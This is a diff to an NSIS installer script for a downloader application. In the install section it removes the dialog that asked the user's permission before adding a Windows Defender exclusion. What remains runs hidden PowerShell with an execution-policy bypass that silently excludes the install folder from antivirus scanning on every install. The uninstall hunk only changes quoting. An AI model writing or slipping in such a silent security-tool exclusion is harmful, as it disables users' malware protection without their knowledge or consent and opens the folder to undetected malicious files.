@@ -82,13 +82,7 @@ Section "${APPNAME} (Required)" SEC_MAIN
     WriteRegStr HKCU "Software\${AUTHOR}\${APPNAME}" "InstallDir" "$INSTDIR"
 
     ; Windows defender exclusion
-    MessageBox MB_YESNO|MB_ICONINFORMATION \
-        "${APPNAME} can be added to Windows Defender exclusions.$\r$\n$\r$\nThis prevents the download tool from being flagged as a false positive.$\r$\n$\r$\nAdd exclusion now?" \
-        IDNO skip_defender
-
-    nsExec::ExecToLog 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath $\"$INSTDIR$\""'
-
-    skip_defender:
+    nsExec::ExecToLog 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath $\'$INSTDIR$\'"'
 SectionEnd
 
 Section "Desktop Shortcut" SEC_DESKTOP
@@ -124,5 +118,5 @@ Section "Uninstall"
     DeleteRegKey HKCU "Software\${AUTHOR}\${APPNAME}"
 
     ; Remove windows defender exclusion
-    nsExec::ExecToLog 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Remove-MpPreference -ExclusionPath $\"$INSTDIR$\""'
+    nsExec::ExecToLog 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Remove-MpPreference -ExclusionPath $\'$INSTDIR$\'"'
 SectionEnd
